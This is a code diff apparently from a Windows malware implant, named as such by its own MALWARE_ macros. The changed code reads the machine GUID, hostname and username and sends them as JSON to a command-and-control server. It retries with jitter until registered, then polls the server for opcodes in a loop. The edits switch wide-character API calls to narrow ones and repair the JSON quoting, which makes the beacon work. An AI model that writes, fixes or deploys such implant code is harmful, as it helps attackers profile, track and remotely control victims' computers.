@@ -37,34 +37,36 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
         // LOG(L"Kill Date passed!\n");
         return -1;
     }
-    wchar_t systemGuidValue[255];
+    char systemGuidValue[255];
     DWORD systemGuidBufferSize = 255;
-    wchar_t systemHostname[MAX_COMPUTERNAME_LENGTH + 1];
+    char systemHostname[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD systemHostnameBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
-    wchar_t systemUsername[UNLEN + 1];
+    char systemUsername[UNLEN + 1];
     DWORD systemUsernameBufferSize = UNLEN + 1;
-    if (RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", RRF_RT_REG_SZ, NULL, systemGuidValue, &systemGuidBufferSize) != 0 || GetComputerNameW(systemHostname, &systemHostnameBufferSize) == 0 || GetUserNameW(systemUsername, &systemUsernameBufferSize) == 0)
+    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, systemGuidValue, &systemGuidBufferSize) != 0 || GetComputerNameA(systemHostname, &systemHostnameBufferSize) == 0 || GetUserNameA(systemUsername, &systemUsernameBufferSize) == 0)
     {
         // Can't register at this point don't know what to do yet.
-        // LOG(L"GUID: %S\n", systemGuidValue);
+        // LOG(L"GUID: %s\n", systemGuidValue);
+        // LOG(L"Hostname: %s\n", systemHostname);
+        // LOG(L"Username: %s\n", systemUsername);
         return -1;
     }
     std::wstring requestHeader(MALWARE_JSON_REQUEST_HEADER); // build post request header
-    std::wstring requestBody;                                // build post request body i.e. json
-    requestBody += L"{\"guid\":\"";
+    std::string requestBody;                                // build post request body i.e. json
+    requestBody += "{\"guid\":\"";
     requestBody += systemGuidValue;
-    requestBody += L"\",\"hostname\":";
+    requestBody += "\",\"hostname\":\"";
     requestBody += systemHostname;
-    requestBody += L"\",\"username\":";
+    requestBody += "\",\"username\":\"";
     requestBody += systemUsername;
-    requestBody += L"\"}";
+    requestBody += "\"}";
     std::wstring result;
     do
     {
         Sleep(MALWARE_SLEEP_MILLISECONDS_JITTER);
         result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_REGISTER_URI, requestHeader, requestBody, MALWARE_C2_SERVER_USE_TLS);
         std::wcout << result << std::endl;
-    } while (result != L"success");
+    } while (result == L"error");
     /*we should be registered, goto main event loop*/
     /*additional init should go here*/
     bool Success = false;
@@ -72,7 +74,7 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
     int opCode;
     while (true)
     {
-        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, L"", L"", MALWARE_C2_SERVER_USE_TLS);
+        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, L"", "", MALWARE_C2_SERVER_USE_TLS);
         
         switch (opCode)
         {
